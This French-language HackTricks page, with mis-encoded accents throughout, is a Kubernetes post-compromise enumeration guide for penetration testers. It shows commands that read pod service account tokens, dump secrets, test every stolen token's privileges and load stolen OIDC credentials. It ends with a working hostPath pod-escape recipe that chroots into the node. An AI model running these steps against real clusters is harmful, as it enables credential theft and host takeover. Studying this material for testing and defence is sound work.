# Kubernetes Enumeration

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Kubernetes Tokens

Si vous avez compromis l'acc√®s √† une machine, l'utilisateur peut avoir acc√®s √† une certaine plateforme Kubernetes. Le token se trouve g√©n√©ralement dans un fichier point√© par la **var env `KUBECONFIG`** ou **dans `~/.kube`**.

Dans ce dossier, vous pourriez trouver des fichiers de configuration avec **tokens et configurations pour se connecter au serveur API**. Dans ce dossier, vous pouvez √©galement trouver un dossier de cache avec des informations pr√©c√©demment r√©cup√©r√©es.

Si vous avez compromis un pod dans un environnement kubernetes, il existe d'autres endroits o√π vous pouvez trouver des tokens et des informations sur l'environnement K8 actuel :

### Service Account Tokens

Avant de continuer, si vous ne savez pas ce qu'est un service dans Kubernetes, je vous sugg√©rerais de **suivre ce lien et de lire au moins les informations sur l'architecture Kubernetes.**

Extrait de la [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) Kubernetes :

_‚ÄúLorsque vous cr√©ez un pod, si vous ne sp√©cifiez pas de compte de service, il se voit automatiquement attribuer le compte de service_ par d√©faut _dans le m√™me namespace.‚Äù_

**ServiceAccount** est un objet g√©r√© par Kubernetes et utilis√© pour fournir une identit√© aux processus qui s'ex√©cutent dans un pod.\
Chaque compte de service a un secret qui lui est associ√© et ce secret contient un token d'acc√®s. C'est un JSON Web Token (JWT), une m√©thode pour repr√©senter des revendications de mani√®re s√©curis√©e entre deux parties.

G√©n√©ralement, **un** des r√©pertoires :

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contient les fichiers :

* **ca.crt** : C'est le certificat ca pour v√©rifier les communications kubernetes
* **namespace** : Il indique le namespace actuel
* **token** : Il contient le **token de service** du pod actuel.

Maintenant que vous avez le token, vous pouvez trouver le serveur API dans la variable d'environnement **`KUBECONFIG`**. Pour plus d'infos, ex√©cutez `(env | set) | grep -i "kuber|kube`**`"`**

Le token du compte de service est sign√© par la cl√© r√©sidant dans le fichier **sa.key** et valid√© par **sa.pub**.

Emplacement par d√©faut sur **Kubernetes** :

* /etc/kubernetes/pki

Emplacement par d√©faut sur **Minikube** :

* /var/lib/localkube/certs

### Hot Pods

_**Les hot pods sont**_ des pods contenant un token de compte de service privil√©gi√©. Un token de compte de service privil√©gi√© est un token qui a la permission d'effectuer des t√¢ches privil√©gi√©es telles que lister des secrets, cr√©er des pods, etc.

## RBAC

Si vous ne savez pas ce qu'est **RBAC**, **lisez cette section**.

## GUI Applications

* **k9s** : Une interface graphique qui √©num√®re un cluster kubernetes depuis le terminal. V√©rifiez les commandes sur [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/). √âcrivez `:namespace` et s√©lectionnez tout pour ensuite rechercher des ressources dans tous les namespaces.
* **k8slens** : Il offre quelques jours d'essai gratuit : [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

Pour √©num√©rer un environnement K8s, vous avez besoin de quelques √©l√©ments :

* Un **token d'authentification valide**. Dans la section pr√©c√©dente, nous avons vu o√π chercher un token utilisateur et un token de compte de service.
* L'**adresse (**_**https://host:port**_**) de l'API Kubernetes**. Cela peut g√©n√©ralement √™tre trouv√© dans les variables d'environnement et/ou dans le fichier de configuration kube.
* **Optionnel** : Le **ca.crt pour v√©rifier le serveur API**. Cela peut √™tre trouv√© aux m√™mes endroits que le token. Cela est utile pour v√©rifier le certificat du serveur API, mais en utilisant `--insecure-skip-tls-verify` avec `kubectl` ou `-k` avec `curl`, vous n'en aurez pas besoin.

Avec ces d√©tails, vous pouvez **√©num√©rer kubernetes**. Si l'**API** pour une raison quelconque est **accessible** via l'**Internet**, vous pouvez simplement t√©l√©charger ces informations et √©num√©rer la plateforme depuis votre h√¥te.

Cependant, g√©n√©ralement, le **serveur API est √† l'int√©rieur d'un r√©seau interne**, donc vous devrez **cr√©er un tunnel** √† travers la machine compromise pour y acc√©der depuis votre machine, ou vous pouvez **t√©l√©charger le** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binaire, ou utiliser **`curl/wget/anything`** pour effectuer des requ√™tes HTTP brutes au serveur API.

### Differences between `list` and `get` verbs

Avec les permissions **`get`**, vous pouvez acc√©der aux informations d'actifs sp√©cifiques (_option `describe` dans `kubectl`_) API :
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Si vous avez la permission **`list`**, vous √™tes autoris√© √† ex√©cuter des requ√™tes API pour lister un type d'actif (_`get` option dans `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Si vous avez la permission **`watch`**, vous √™tes autoris√© √† ex√©cuter des requ√™tes API pour surveiller les actifs :
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Ils ouvrent une connexion de streaming qui vous renvoie le manifeste complet d'un D√©ploiement chaque fois qu'il change (ou lorsqu'un nouveau est cr√©√©).

{% hint style="danger" %}
Les commandes `kubectl` suivantes indiquent comment lister les objets. Si vous souhaitez acc√©der aux donn√©es, vous devez utiliser `describe` au lieu de `get`
{% endhint %}

### Utilisation de curl

Depuis l'int√©rieur d'un pod, vous pouvez utiliser plusieurs variables d'environnement :
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Par d√©faut, le pod peut **acc√©der** au **serveur kube-api** dans le nom de domaine **`kubernetes.default.svc`** et vous pouvez voir le r√©seau kube dans **`/etc/resolv.config`** car ici vous trouverez l'adresse du serveur DNS kubernetes (le ".1" du m√™me r√©seau est le point de terminaison kube-api).
{% endhint %}

### Utilisation de kubectl

Ayant le jeton et l'adresse du serveur API, vous utilisez kubectl ou curl pour y acc√©der comme indiqu√© ici :

Par d√©faut, l'APISERVER communique avec le sch√©ma `https://`

{% code overflow="wrap" %}
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
{% endcode %}

> si `https://` n'est pas pr√©sent dans l'URL, vous pourriez obtenir une erreur comme Bad Request.

Vous pouvez trouver un [**cheat sheet officiel de kubectl ici**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). L'objectif des sections suivantes est de pr√©senter de mani√®re ordonn√©e diff√©rentes options pour √©num√©rer et comprendre le nouveau K8s auquel vous avez obtenu acc√®s.

Pour trouver la requ√™te HTTP que `kubectl` envoie, vous pouvez utiliser le param√®tre `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configuration Actuelle

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Si vous avez r√©ussi √† voler les identifiants de certains utilisateurs, vous pouvez **les configurer localement** en utilisant quelque chose comme :
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obtenir les ressources prises en charge

Avec ces informations, vous saurez tous les services que vous pouvez lister

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Obtenir les privil√®ges actuels

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Une autre fa√ßon de v√©rifier vos privil√®ges est d'utiliser l'outil : [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

Vous pouvez en apprendre davantage sur **Kubernetes RBAC** dans :

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Une fois que vous savez quels privil√®ges** vous avez, consultez la page suivante pour d√©terminer **si vous pouvez en abuser** pour escalader les privil√®ges :

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obtenir d'autres r√¥les

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obtenir des namespaces

Kubernetes prend en charge **plusieurs clusters virtuels** soutenus par le m√™me cluster physique. Ces clusters virtuels sont appel√©s **namespaces**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Obtenir des secrets

{% tabs %}
{% tab title="kubectl" %}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Si vous pouvez lire les secrets, vous pouvez utiliser les lignes suivantes pour obtenir les privil√®ges li√©s √† chaque jeton :
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obtenir des Comptes de Service

Comme discut√© au d√©but de cette page **lorsqu'un pod est ex√©cut√©, un compte de service lui est g√©n√©ralement attribu√©**. Par cons√©quent, lister les comptes de service, leurs permissions et o√π ils s'ex√©cutent peut permettre √† un utilisateur d'escalader ses privil√®ges.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Obtenir des D√©ploiements

Les d√©ploiements sp√©cifient les **composants** qui doivent √™tre **ex√©cut√©s**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obtenir des Pods

Les Pods sont les **conteneurs** r√©els qui vont **s'ex√©cuter**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obtenir des services

Les **services** Kubernetes sont utilis√©s pour **exposer un service sur un port et une IP sp√©cifiques** (qui agira comme un √©quilibreur de charge pour les pods qui offrent r√©ellement le service). Il est int√©ressant de savoir o√π vous pouvez trouver d'autres services √† essayer d'attaquer.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obtenir les n≈ìuds

Obtenez tous les **n≈ìuds configur√©s √† l'int√©rieur du cluster**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obtenir les DaemonSets

**DaeamonSets** permet de s'assurer qu'un **pod sp√©cifique s'ex√©cute sur tous les n≈ìuds** du cluster (ou sur ceux s√©lectionn√©s). Si vous supprimez le DaemonSet, les pods g√©r√©s par celui-ci seront √©galement supprim√©s.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Obtenir un cronjob

Les cron jobs permettent de planifier √† l'aide d'une syntaxe similaire √† crontab le lancement d'un pod qui effectuera une action.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Obtenir configMap

configMap contient toujours beaucoup d'informations et de fichiers de configuration qui sont fournis aux applications qui s'ex√©cutent dans le kubernetes. En g√©n√©ral, vous pouvez trouver beaucoup de mots de passe, de secrets, de jetons utilis√©s pour se connecter et valider d'autres services internes/externes.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}
{% endtabs %}

### Obtenir des politiques r√©seau / Politiques r√©seau Cilium

{% tabs %}
{% tab title="Premier onglet" %}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{% endtab %}
{% endtabs %}

### Obtenir Tout / Tout

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all
```
{% endtab %}
{% endtabs %}

### **Obtenez toutes les ressources g√©r√©es par helm**

{% tabs %}
{% tab title="kubectl" %}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{% endtab %}
{% endtabs %}

### **Obtenir les consommations des Pods**

{% tabs %}
{% tab title="kubectl" %}
```bash
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### √âvasion du pod

Si vous √™tes capable de cr√©er de nouveaux pods, vous pourriez √™tre en mesure de vous √©chapper d'eux vers le n≈ìud. Pour ce faire, vous devez cr√©er un nouveau pod en utilisant un fichier yaml, passer au pod cr√©√©, puis chroot dans le syst√®me du n≈ìud. Vous pouvez utiliser des pods d√©j√† existants comme r√©f√©rence pour le fichier yaml, car ils affichent des images et des chemins existants.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> si vous devez cr√©er un pod sur un n≈ìud sp√©cifique, vous pouvez utiliser la commande suivante pour obtenir les √©tiquettes sur le n≈ìud
>
> `k get nodes --show-labels`
>
> En g√©n√©ral, kubernetes.io/hostname et node-role.kubernetes.io/master sont de bonnes √©tiquettes √† s√©lectionner.

Ensuite, vous cr√©ez votre fichier attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Apr√®s cela, vous cr√©ez le pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Maintenant, vous pouvez passer au pod cr√©√© comme suit
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Et enfin, vous chroot dans le syst√®me du n≈ìud.
```bash
chroot /root /bin/bash
```
Information obtenue √† partir de : [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## R√©f√©rences

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
